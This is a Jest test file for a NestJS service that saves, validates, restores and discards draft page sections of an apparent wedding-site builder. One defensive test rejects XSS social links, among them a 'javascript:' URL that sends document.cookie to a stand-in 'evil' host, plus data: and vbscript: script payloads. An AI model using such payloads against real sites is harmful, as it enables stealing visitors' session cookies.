import {
  BadRequestException,
  ConflictException,
  NotFoundException,
} from "@nestjs/common";
import { Test, TestingModule } from "@nestjs/testing";
import { getRepositoryToken } from "@nestjs/typeorm";
import { isUUID } from "class-validator";
import { DataSource, FindOperator } from "typeorm";
import { errorCodeConstants } from "../libs/constants/error-code.constants";
import { MediaType } from "../libs/entity/enums/media-type.enum";
import { SectionType } from "../libs/entity/enums/section-type.enum";
import {
  PagePublication,
  PublishedSection,
} from "../libs/entity/page-publication.entity";
import { PageSection } from "../libs/entity/page-section.entity";
import { PageMediaService } from "../page/page-media.service";
import { PageService } from "../page/page.service";
import { StorageService } from "../storage/storage.service";
import { PageConfigDto, PageSectionDto } from "./dto/page-config.dto";
import { PageConfigsService } from "./page-configs.service";

const HOME = 1;
const STORY = 2;

type Row = {
  id: string;
  uuid: string;
  pageId: number;
  type: SectionType;
  sortOrder: number;
  isVisible: boolean;
  data: Record<string, unknown>;
};

/** A `where` as TypeORM hands it over, so `In(...)` survives the trip. */
type Where = { [K in keyof Row]?: Row[K] | FindOperator<Row[K]> };

function isInOperator(value: unknown): value is FindOperator<unknown> {
  return value instanceof FindOperator && value.type === "in";
}

/**
 * In-memory stand-in for the sections table.
 *
 * Ids are strings on purpose: Postgres hands back `bigint` columns as strings,
 * and a save maps uuids onto them to tell an update from an insert.
 */
class FakeStore {
  rows: Row[] = [];
  private nextId = 1;

  seed(rows: Partial<Row>[]): void {
    rows.forEach((row, index) => {
      const id = String(this.nextId++);

      this.rows.push({
        id,
        uuid: `uuid-${id}`,
        pageId: HOME,
        type: SectionType.GALLERY,
        sortOrder: index,
        isVisible: true,
        data: {},
        ...row,
      });
    });
  }

  private matches(row: Row, where: Where = {}): boolean {
    return Object.entries(where).every(([key, value]) => {
      const actual = row[key as keyof Row];

      // `In(...)` arrives as a FindOperator rather than a bare value.
      if (isInOperator(value)) {
        const wanted: unknown[] = Array.isArray(value.value)
          ? value.value
          : [value.value];

        // Only ever used on identity columns, so a direct compare is enough.
        return wanted.some((candidate) => candidate === actual);
      }

      // Ids are compared as strings, the way Postgres hands back bigints.
      return key === "id"
        ? row.id === String(value as string | number)
        : actual === value;
    });
  }

  find(options: { where?: Where } = {}): Row[] {
    return this.rows
      .filter((row) => this.matches(row, options.where))
      .sort((a, b) => a.sortOrder - b.sortOrder || Number(a.id) - Number(b.id))
      .map((row) => ({ ...row }));
  }

  save(entity: Partial<Row>): Row {
    if (entity.id === undefined) {
      // Spread first: an insert arrives carrying `id: undefined`, and the
      // sequence's value has to survive it the way Postgres' would.
      const row = { ...entity, id: String(this.nextId++) } as Row;
      this.rows.push(row);

      return { ...row };
    }

    const existing = this.rows.find((row) => row.id === String(entity.id));
    Object.assign(existing, entity);

    return { ...existing };
  }

  delete(criteria: number | string | string[] | Where): void {
    if (Array.isArray(criteria)) {
      const ids = criteria.map(String);

      this.rows = this.rows.filter((row) => !ids.includes(row.id));

      return;
    }

    const where =
      typeof criteria === "object" ? criteria : { id: String(criteria) };

    this.rows = this.rows.filter((row) => !this.matches(row, where));
  }

  /** The sequence a page render would produce, for order assertions. */
  layout(pageId = HOME): { id: string; sortOrder: number }[] {
    return this.find({ where: { pageId } }).map(({ id, sortOrder }) => ({
      id,
      sortOrder,
    }));
  }
}

const heroData = { title: "Ada & Alan", subtitle: "are getting married" };
const sectionDto = (
  overrides: Partial<PageSectionDto> = {},
): PageSectionDto => ({
  uuid: "uuid-1",
  type: SectionType.GALLERY,
  data: {},
  isVisible: true,
  ...overrides,
});
const config = (
  sections: PageSectionDto[],
  draftVersion = 0,
): PageConfigDto => ({ draftVersion, sections });
const imageRef = (key: string) => ({ key, mediaType: MediaType.IMAGE });
const galleryData = (...keys: string[]) => ({
  images: keys.map(imageRef),
});

describe("PageConfigsService", () => {
  let service: PageConfigsService;
  let store: FakeStore;
  let prune: jest.Mock;
  /** Keys the pruner has already collected, so a save may not reference them. */
  let unavailableKeys: string[];
  let live: PublishedSection[] | null;
  /** `pages` rows, keyed by id — only `draftVersion` is ever read or written. */
  let draftVersions: Map<number, number>;

  beforeEach(async () => {
    store = new FakeStore();
    prune = jest.fn().mockResolvedValue(undefined);
    unavailableKeys = [];
    live = null;
    draftVersions = new Map([
      [HOME, 0],
      [STORY, 0],
    ]);

    const manager = {
      create: jest.fn((_entity: unknown, plain: Partial<Row>) => ({
        ...plain,
      })),
      save: jest.fn((entity: Partial<Row> | Partial<Row>[]) =>
        Promise.resolve(
          Array.isArray(entity)
            ? entity.map((row) => store.save(row))
            : store.save(entity),
        ),
      ),
      find: jest.fn((_entity: unknown, options: { where?: Where }) =>
        Promise.resolve(store.find(options)),
      ),
      findOne: jest.fn((_entity: unknown, options: { where: { id: number } }) =>
        Promise.resolve(
          draftVersions.has(options.where.id)
            ? {
                id: options.where.id,
                draftVersion: draftVersions.get(options.where.id),
              }
            : null,
        ),
      ),
      update: jest.fn(
        (_entity: unknown, id: number, patch: { draftVersion: number }) => {
          draftVersions.set(id, patch.draftVersion);

          return Promise.resolve(undefined);
        },
      ),
      increment: jest.fn(
        (
          _entity: unknown,
          criteria: { id: number },
          _column: string,
          by: number,
        ) => {
          draftVersions.set(criteria.id, draftVersions.get(criteria.id) + by);

          return Promise.resolve(undefined);
        },
      ),
      delete: jest.fn((_entity: unknown, criteria: string[] | number | Where) =>
        Promise.resolve(store.delete(criteria)),
      ),
    };

    const module: TestingModule = await Test.createTestingModule({
      providers: [
        PageConfigsService,
        {
          provide: getRepositoryToken(PagePublication),
          useValue: {
            // Only ever asked for the newest publication of one page.
            findOne: jest.fn(() =>
              Promise.resolve(live === null ? null : { sections: live }),
            ),
          },
        },
        {
          provide: getRepositoryToken(PageSection),
          useValue: {
            find: jest.fn((options: { where?: Where } = {}) =>
              Promise.resolve(store.find(options)),
            ),
          },
        },
        {
          provide: PageService,
          useValue: {
            findBySlugOrFail: jest.fn((slug: string) => {
              if (slug === "home")
                return Promise.resolve({
                  id: HOME,
                  draftVersion: draftVersions.get(HOME),
                });
              if (slug === "story")
                return Promise.resolve({
                  id: STORY,
                  draftVersion: draftVersions.get(STORY),
                });

              return Promise.reject(new NotFoundException("Page not found."));
            }),
          },
        },
        {
          provide: PageMediaService,
          useValue: {
            pruneUnreferenced: prune,
            lockReferencedKeys: jest.fn((_manager: unknown, keys: string[]) =>
              Promise.resolve(
                keys.filter((key) => unavailableKeys.includes(key)),
              ),
            ),
          },
        },
        {
          provide: StorageService,
          useValue: {
            getPublicUrl: (key: string) =>
              key ? `https://cdn.test/${key}` : null,
          },
        },
        {
          provide: DataSource,
          useValue: {
            transaction: jest.fn((work: (m: unknown) => unknown) =>
              work(manager),
            ),
          },
        },
      ],
    }).compile();

    service = module.get<PageConfigsService>(PageConfigsService);
  });

  describe("save", () => {
    it("creates a section it has not seen before", async () => {
      await service.save(
        "home",
        config([
          sectionDto({ uuid: "a", type: SectionType.HERO, data: heroData }),
        ]),
      );

      expect(store.rows).toHaveLength(1);
      expect(store.rows[0]).toMatchObject({
        uuid: "a",
        pageId: HOME,
        type: SectionType.HERO,
        sortOrder: 0,
        isVisible: true,
        data: heroData,
      });
      expect(
        store.find({ where: { pageId: HOME } }).map((row) => row.uuid),
      ).toEqual(["a"]);
    });

    it("updates the row a known uuid already has, rather than inserting a second one", async () => {
      store.seed([{ uuid: "a", type: SectionType.HERO, data: heroData }]);

      await service.save(
        "home",
        config([
          sectionDto({
            uuid: "a",
            type: SectionType.HERO,
            data: { ...heroData, subtitle: "next spring" },
            isVisible: false,
          }),
        ]),
      );

      expect(store.rows).toHaveLength(1);
      expect(store.rows[0]).toMatchObject({
        id: "1",
        isVisible: false,
        data: { ...heroData, subtitle: "next spring" },
      });
    });

    /** The payload carries no positions, so the array is the running order. */
    it("numbers positions from the order the sections arrive in", async () => {
      store.seed([
        { uuid: "a", sortOrder: 0 },
        { uuid: "b", sortOrder: 1 },
      ]);

      await service.save(
        "home",
        config([
          sectionDto({ uuid: "b" }),
          sectionDto({ uuid: "fresh" }),
          sectionDto({ uuid: "a" }),
        ]),
      );

      expect(
        store
          .find({ where: { pageId: HOME } })
          .map((row) => [row.uuid, row.sortOrder]),
      ).toEqual([
        ["b", 0],
        ["fresh", 1],
        ["a", 2],
      ]);
    });

    it("deletes rows the payload no longer carries", async () => {
      store.seed([{ uuid: "a" }, { uuid: "b" }]);

      await service.save("home", config([sectionDto({ uuid: "a" })]));

      expect(store.rows.map((row) => row.uuid)).toEqual(["a"]);
    });

    it("clears the draft when the payload carries nothing", async () => {
      store.seed([{ uuid: "a" }, { uuid: "b" }]);

      await service.save("home", config([]));

      expect(store.rows).toHaveLength(0);
    });

    /** `uuid` is unique across every page, so this cannot become a second row. */
    it("refuses a uuid that belongs to another page", async () => {
      store.seed([{ uuid: "elsewhere", pageId: STORY }]);

      const stolen = service.save(
        "home",
        config([sectionDto({ uuid: "elsewhere" })]),
      );

      await expect(stolen).rejects.toBeInstanceOf(ConflictException);
      await expect(stolen).rejects.toMatchObject({
        response: { error: errorCodeConstants.SECTION_UUID_TAKEN },
      });
      expect(store.find({ where: { pageId: STORY } })).toHaveLength(1);
      expect(store.find({ where: { pageId: HOME } })).toHaveLength(0);
    });

    it("empties its own page without reaching another one", async () => {
      store.seed([{ uuid: "elsewhere", pageId: STORY }]);

      await service.save("home", config([]));

      expect(store.find({ where: { pageId: STORY } })).toHaveLength(1);
    });

    it("lets a section change type, revalidating the payload against the new one", async () => {
      store.seed([
        { uuid: "a", type: SectionType.GALLERY, data: galleryData("a.jpg") },
      ]);

      await service.save(
        "home",
        config([
          sectionDto({ uuid: "a", type: SectionType.HERO, data: heroData }),
        ]),
      );

      expect(store.rows[0]).toMatchObject({
        id: "1",
        type: SectionType.HERO,
        data: heroData,
      });
    });

    it("rejects a type change whose payload does not fit the new schema", async () => {
      store.seed([{ uuid: "a", type: SectionType.GALLERY }]);

      await expect(
        service.save(
          "home",
          config([sectionDto({ uuid: "a", type: SectionType.HERO, data: {} })]),
        ),
      ).rejects.toBeInstanceOf(BadRequestException);
      expect(store.rows[0].type).toBe(SectionType.GALLERY);
    });

    /** One round trip per broken section would be one round trip too many. */
    it("reports every invalid payload at once", async () => {
      const invalid = service.save(
        "home",
        config([
          sectionDto({ uuid: "a", type: SectionType.HERO, data: {} }),
          sectionDto({
            uuid: "b",
            type: SectionType.COUNTDOWN,
            data: { targetDate: "next tuesday" },
          }),
        ]),
      );

      await expect(invalid).rejects.toMatchObject({
        response: { error: errorCodeConstants.SECTION_PAYLOAD_INVALID },
      });
      await expect(invalid).rejects.toThrow(
        /sections\[0\][\s\S]*sections\[1\]/,
      );
      expect(store.rows).toHaveLength(0);
    });

    it("stores the parsed payload, dropping response-only urls and stray fields", async () => {
      await service.save(
        "home",
        config([
          sectionDto({
            uuid: "a",
            type: SectionType.GALLERY,
            data: {
              heading: "Album",
              sneaky: "<script>",
              images: [{ ...imageRef("a.jpg"), url: "https://cdn.test/a.jpg" }],
            },
          }),
        ]),
      );

      expect(store.rows[0].data).toEqual({
        heading: "Album",
        images: [imageRef("a.jpg")],
      });
    });

    it("rejects a second instance of a singleton type", async () => {
      const twoHeroes = service.save(
        "home",
        config([
          sectionDto({ uuid: "a", type: SectionType.HERO, data: heroData }),
          sectionDto({ uuid: "b", type: SectionType.HERO, data: heroData }),
        ]),
      );

      await expect(twoHeroes).rejects.toBeInstanceOf(ConflictException);
      await expect(twoHeroes).rejects.toMatchObject({
        response: { error: errorCodeConstants.SECTION_TYPE_ALREADY_EXISTS },
      });
    });

    it("allows several galleries", async () => {
      await service.save(
        "home",
        config([
          sectionDto({ uuid: "a", type: SectionType.GALLERY }),
          sectionDto({ uuid: "b", type: SectionType.GALLERY }),
        ]),
      );

      expect(store.find({ where: { pageId: HOME } })).toHaveLength(2);
    });

    it("offers every key the page held for collection, once the write is committed", async () => {
      store.seed([
        {
          uuid: "a",
          type: SectionType.GALLERY,
          data: galleryData("a.jpg", "b.jpg"),
        },
        { uuid: "b", type: SectionType.GALLERY, data: galleryData("c.jpg") },
      ]);

      prune.mockImplementation(() => {
        // The pruner counts references by reading the tables, so it must not
        // still see the rows this save replaced.
        expect(store.rows.map((row) => row.uuid)).toEqual(["a"]);

        return Promise.resolve();
      });

      await service.save(
        "home",
        config([
          sectionDto({
            uuid: "a",
            type: SectionType.GALLERY,
            data: galleryData("a.jpg"),
          }),
        ]),
      );

      // Whether they are actually deleted is PageMediaService's call — it also
      // has to check publications, which this service knows nothing about.
      expect(prune).toHaveBeenCalledWith(["a.jpg", "b.jpg", "c.jpg"]);
    });

    it("stores the draft so the next read returns it, urls resolved", async () => {
      await service.save(
        "home",
        config([
          sectionDto({
            uuid: "a",
            type: SectionType.GALLERY,
            data: galleryData("a.jpg"),
          }),
        ]),
      );

      const { sections } = await service.findDraft("home");

      expect(sections).toEqual([
        {
          id: "1",
          uuid: "a",
          type: SectionType.GALLERY,
          sortOrder: 0,
          isVisible: true,
          data: {
            images: [{ ...imageRef("a.jpg"), url: "https://cdn.test/a.jpg" }],
          },
        },
      ]);
    });

    /** A retried request must not double-insert, which is the point of the uuid. */
    it("is a no-op when the same body is replayed with a current token", async () => {
      const sections = [
        sectionDto({ uuid: "a", type: SectionType.HERO, data: heroData }),
        sectionDto({ uuid: "b", type: SectionType.GALLERY }),
      ];

      await service.save("home", config(sections));
      const after = store.find({ where: { pageId: HOME } });

      await service.save("home", config(sections, draftVersions.get(HOME)));

      expect(store.find({ where: { pageId: HOME } })).toEqual(after);
      expect(store.rows).toHaveLength(2);
    });

    /**
     * The payload is the whole draft, so a save built from an older read would
     * delete every section added since — this is the one guard against it.
     */
    it("refuses a save built from a stale draft, writing nothing", async () => {
      const stale = config([
        sectionDto({ uuid: "a", type: SectionType.HERO, data: heroData }),
      ]);

      // Someone else saves first, moving the version on.
      await service.save(
        "home",
        config([sectionDto({ uuid: "theirs", type: SectionType.GALLERY })]),
      );
      prune.mockClear();

      await expect(service.save("home", stale)).rejects.toMatchObject({
        response: { error: errorCodeConstants.DRAFT_OUT_OF_DATE },
      });
      expect(
        store.find({ where: { pageId: HOME } }).map((row) => row.uuid),
      ).toEqual(["theirs"]);
      expect(prune).not.toHaveBeenCalled();
    });

    it("hands the next save a new token on every write", async () => {
      await service.save("home", config([sectionDto({ uuid: "a" })]));

      expect(draftVersions.get(HOME)).toBe(1);

      await service.save(
        "home",
        config([sectionDto({ uuid: "a" })], draftVersions.get(HOME)),
      );

      expect(draftVersions.get(HOME)).toBe(2);
    });

    /**
     * The pruner tombstones a row before deleting its object, so a key it has
     * already collected must not be stored as a reference — that would leave a
     * committed section pointing at a file that no longer exists.
     */
    it("refuses a payload referencing a file that has been collected", async () => {
      unavailableKeys = ["gone.jpg"];

      const stale = service.save(
        "home",
        config([
          sectionDto({
            uuid: "a",
            type: SectionType.GALLERY,
            data: galleryData("gone.jpg"),
          }),
        ]),
      );

      await expect(stale).rejects.toMatchObject({
        response: { error: errorCodeConstants.MEDIA_UNAVAILABLE },
      });
      expect(store.rows).toHaveLength(0);
    });

    /**
     * Every one of these values is served to visitors by the public read, so a
     * scheme the renderer can execute is stored XSS rather than a bad link.
     */
    it.each([
      ["javascript:", "javascript:fetch('//evil/'+document.cookie)"],
      ["data:", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="],
      ["vbscript:", "vbscript:msgbox(1)"],
    ])("refuses a %s social link", async (_scheme, url) => {
      const invalid = service.save(
        "home",
        config([
          sectionDto({
            uuid: "a",
            type: SectionType.COUPLE,
            data: {
              bride: { name: "Ada", socials: [{ platform: "x", url }] },
              groom: { name: "Alan" },
            },
          }),
        ]),
      );

      await expect(invalid).rejects.toMatchObject({
        response: { error: errorCodeConstants.SECTION_PAYLOAD_INVALID },
      });
      expect(store.rows).toHaveLength(0);
    });

    it("accepts an https social link", async () => {
      await service.save(
        "home",
        config([
          sectionDto({
            uuid: "a",
            type: SectionType.COUPLE,
            data: {
              bride: {
                name: "Ada",
                socials: [{ platform: "x", url: "https://x.test/ada" }],
              },
              groom: { name: "Alan" },
            },
          }),
        ]),
      );

      expect(store.rows).toHaveLength(1);
    });

    /**
     * A venue-local ceremony time is naturally written with an offset, and
     * only UTC `Z` used to be accepted — so the reception section could not be
     * saved at all from an offset-aware picker.
     */
    it.each([
      ["a UTC offset", "2026-08-25T15:00:00+08:00"],
      ["UTC Z", "2026-08-25T07:00:00Z"],
      ["milliseconds", "2026-08-25T07:00:00.000Z"],
    ])("accepts a reception time carrying %s", async (_form, startsAt) => {
      await service.save(
        "home",
        config([
          sectionDto({
            uuid: "a",
            type: SectionType.RECEPTION,
            data: {
              venueName: "The Glasshouse",
              address: "1 Garden Road",
              startsAt,
            },
          }),
        ]),
      );

      expect(store.rows).toHaveLength(1);
    });

    /** A wall-clock time with no zone means something different per visitor. */
    it.each([
      ["a bare datetime-local value", "2026-08-25T15:00"],
      ["seconds but no zone", "2026-08-25T15:00:00"],
      ["prose", "next tuesday"],
    ])("refuses a reception time given as %s", async (_form, startsAt) => {
      const invalid = service.save(
        "home",
        config([
          sectionDto({
            uuid: "a",
            type: SectionType.RECEPTION,
            data: {
              venueName: "The Glasshouse",
              address: "1 Garden Road",
              startsAt,
            },
          }),
        ]),
      );

      await expect(invalid).rejects.toMatchObject({
        response: { error: errorCodeConstants.SECTION_PAYLOAD_INVALID },
      });
      expect(store.rows).toHaveLength(0);
    });

    it("404s on an unknown page", async () => {
      await expect(service.save("nope", config([]))).rejects.toBeInstanceOf(
        NotFoundException,
      );
    });
  });

  /**
   * The singleton rule and position density are both per page. Nothing fails
   * until a second page exists, which is exactly why these are worth pinning.
   */
  describe("page scoping", () => {
    it("allows the same singleton type on a different page", async () => {
      store.seed([{ pageId: HOME, type: SectionType.HERO, data: heroData }]);

      await service.save(
        "story",
        config([
          sectionDto({ uuid: "b", type: SectionType.HERO, data: heroData }),
        ]),
      );

      expect(store.find({ where: { pageId: STORY } })).toMatchObject([
        { type: SectionType.HERO, sortOrder: 0 },
      ]);
    });

    it("numbers each page's positions independently", async () => {
      store.seed([
        { pageId: HOME, sortOrder: 0 },
        { pageId: HOME, sortOrder: 1 },
      ]);

      await service.save("story", config([sectionDto({ uuid: "c" })]));

      expect(store.layout(HOME)).toEqual([
        { id: "1", sortOrder: 0 },
        { id: "2", sortOrder: 1 },
      ]);
      expect(store.layout(STORY)).toEqual([{ id: "3", sortOrder: 0 }]);
    });

    it("leaves another page's draft alone", async () => {
      store.seed([{ pageId: STORY, uuid: "other" }]);

      await service.save("home", config([sectionDto({ uuid: "mine" })]));

      expect(
        store.find({ where: { pageId: STORY } }).map((row) => row.uuid),
      ).toEqual(["other"]);
    });

    it("returns only the requested page's draft", async () => {
      store.seed([
        { pageId: HOME, type: SectionType.HERO, data: heroData },
        { pageId: STORY, type: SectionType.GALLERY },
      ]);

      const { sections } = await service.findDraft("home");

      expect(sections).toHaveLength(1);
      expect(sections[0].type).toBe(SectionType.HERO);
    });
  });

  describe("findDraft", () => {
    it("includes hidden sections, in display order", async () => {
      store.seed([
        { type: SectionType.HERO, sortOrder: 1, data: heroData },
        {
          type: SectionType.GALLERY,
          sortOrder: 0,
          isVisible: false,
          data: galleryData("a.jpg"),
        },
      ]);

      const { sections } = await service.findDraft("home");

      expect(sections.map((section) => section.type)).toEqual([
        SectionType.GALLERY,
        SectionType.HERO,
      ]);
    });

    it("hands out the token a save has to quote back", async () => {
      draftVersions.set(HOME, 7);

      await expect(service.findDraft("home")).resolves.toMatchObject({
        draftVersion: 7,
      });
    });

    it("resolves a public url beside every media key", async () => {
      store.seed([{ type: SectionType.GALLERY, data: galleryData("a.jpg") }]);

      const {
        sections: [gallery],
      } = await service.findDraft("home");

      expect(gallery.data).toEqual({
        images: [{ ...imageRef("a.jpg"), url: "https://cdn.test/a.jpg" }],
      });
    });
  });

  describe("snapshot projection and restore", () => {
    it("projects the draft without ids, keeping hidden sections", async () => {
      store.seed([
        { type: SectionType.HERO, sortOrder: 0, data: heroData },
        { type: SectionType.GALLERY, sortOrder: 1, isVisible: false },
      ]);

      const snapshot = await service.projectToSnapshot(HOME);

      expect(snapshot).toEqual([
        {
          type: SectionType.HERO,
          sortOrder: 0,
          isVisible: true,
          data: heroData,
        },
        {
          type: SectionType.GALLERY,
          sortOrder: 1,
          isVisible: false,
          data: {},
        },
      ]);
    });

    it("keeps raw keys in the snapshot rather than resolved urls", async () => {
      store.seed([{ type: SectionType.GALLERY, data: galleryData("a.jpg") }]);

      const [gallery] = await service.projectToSnapshot(HOME);

      expect(gallery.data).toEqual({ images: [imageRef("a.jpg")] });
    });

    it("replaces the page's draft and renumbers densely", async () => {
      store.seed([{ sortOrder: 0 }, { sortOrder: 1 }]);

      await service.replaceAllSections(HOME, [
        {
          type: SectionType.HERO,
          sortOrder: 7,
          isVisible: true,
          data: heroData,
        },
        {
          type: SectionType.GALLERY,
          sortOrder: 3,
          isVisible: false,
          data: {},
        },
      ]);

      const restored = store.find({ where: { pageId: HOME } });

      expect(restored.map((row) => [row.type, row.sortOrder])).toEqual([
        [SectionType.GALLERY, 0],
        [SectionType.HERO, 1],
      ]);
    });

    /**
     * The editor posts these uuids back on its next save, where
     * `PageSectionDto` runs the very same check. A short base58 id would be
     * accepted here and then rejected there, leaving the draft unsavable.
     */
    it("mints uuids that pass the save DTO's own validator", async () => {
      await service.replaceAllSections(HOME, [
        {
          type: SectionType.HERO,
          sortOrder: 0,
          isVisible: true,
          data: heroData,
        },
      ]);

      const [restored] = store.find({ where: { pageId: HOME } });

      expect(isUUID(restored.uuid)).toBe(true);
    });

    it("restores hidden sections rather than silently dropping them", async () => {
      await service.replaceAllSections(HOME, [
        {
          type: SectionType.GALLERY,
          sortOrder: 0,
          isVisible: false,
          data: {},
        },
      ]);

      expect(store.find({ where: { pageId: HOME } })[0].isVisible).toBe(false);
    });

    it("leaves other pages untouched", async () => {
      store.seed([{ pageId: STORY, sortOrder: 0 }]);

      await service.replaceAllSections(HOME, []);

      expect(store.find({ where: { pageId: STORY } })).toHaveLength(1);
    });

    it("empties the draft when there is nothing to restore", async () => {
      store.seed([{ pageId: HOME }]);

      await service.replaceAllSections(HOME, []);

      expect(store.find({ where: { pageId: HOME } })).toHaveLength(0);
    });
  });

  describe("discard", () => {
    const published = (
      type: SectionType,
      overrides: Partial<PublishedSection> = {},
    ): PublishedSection => ({
      type,
      sortOrder: 0,
      isVisible: true,
      data: {},
      ...overrides,
    });

    it("replaces the draft with what is live, hidden sections included", async () => {
      store.seed([{ uuid: "draft-only", type: SectionType.COUPLE }]);
      live = [
        published(SectionType.HERO, { data: heroData }),
        published(SectionType.GALLERY, { sortOrder: 1, isVisible: false }),
      ];

      await service.discard("home");

      expect(
        store
          .find({ where: { pageId: HOME } })
          .map((row) => [row.type, row.sortOrder, row.isVisible]),
      ).toEqual([
        [SectionType.HERO, 0, true],
        [SectionType.GALLERY, 1, false],
      ]);
    });

    /**
     * `uuid` is NOT NULL, and a snapshot carries none — it stores content, not
     * identity. Restored rows have to be minted one or the insert fails.
     */
    it("mints a uuid for every restored section", async () => {
      store.seed([{ uuid: "draft-only" }]);
      live = [
        published(SectionType.HERO),
        published(SectionType.GALLERY, { sortOrder: 1 }),
      ];

      await service.discard("home");

      const uuids = store
        .find({ where: { pageId: HOME } })
        .map((row) => row.uuid);

      expect(
        uuids.every((uuid) => typeof uuid === "string" && uuid.length > 0),
      ).toBe(true);
      expect(new Set(uuids).size).toBe(2);
      expect(uuids).not.toContain("draft-only");
    });

    it("offers images that only ever existed in the draft for collection", async () => {
      store.seed([{ data: galleryData("never-published.jpg") }]);
      live = [published(SectionType.HERO)];

      await service.discard("home");

      expect(prune).toHaveBeenCalledWith(["never-published.jpg"]);
    });

    /**
     * With nothing live there is nothing to restore *to*, and emptying the
     * draft would destroy unpublished work no copy exists of.
     */
    it("refuses rather than wiping a draft that has never been published", async () => {
      store.seed([{ type: SectionType.HERO }]);

      await expect(service.discard("home")).rejects.toBeInstanceOf(
        NotFoundException,
      );
      expect(store.find({ where: { pageId: HOME } })).toHaveLength(1);
      expect(prune).not.toHaveBeenCalled();
    });

    it("leaves other pages alone", async () => {
      store.seed([{ pageId: STORY }]);
      live = [published(SectionType.HERO)];

      await service.discard("home");

      expect(store.find({ where: { pageId: STORY } })).toHaveLength(1);
    });

    /** An editor still holding the discarded draft must not restore it. */
    it("moves the token on, so a save from the discarded draft is refused", async () => {
      store.seed([{ uuid: "a", type: SectionType.COUPLE }]);
      live = [published(SectionType.HERO)];
      const beforeDiscard = config([sectionDto({ uuid: "a" })], 0);

      await service.discard("home");

      await expect(service.save("home", beforeDiscard)).rejects.toMatchObject({
        response: { error: errorCodeConstants.DRAFT_OUT_OF_DATE },
      });
    });
  });
});
